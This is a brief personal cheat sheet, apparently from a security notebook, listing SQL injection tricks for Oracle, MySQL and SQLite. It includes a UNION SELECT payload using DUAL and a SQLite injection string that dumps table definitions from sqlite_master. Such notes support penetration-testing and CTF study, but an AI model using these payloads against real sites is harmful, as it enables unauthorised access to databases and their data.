[[oracle]]
[[mysql]]
[[SQLi]]
#sql
#### Oracle
* `SELECT * FROM v$version`
* required table DUAL for empty select: `' UNION SELECT NULL FROM DUAL--`
* string concat `username||password`

##### MySQL
* Required space after comment: `--<space>`

##### Sqlite
Get tables definition:
```
asd'))+union+select+sql,2,3,4,5,6,7,8,9+from+sqlite_master+where+type='table'--
```
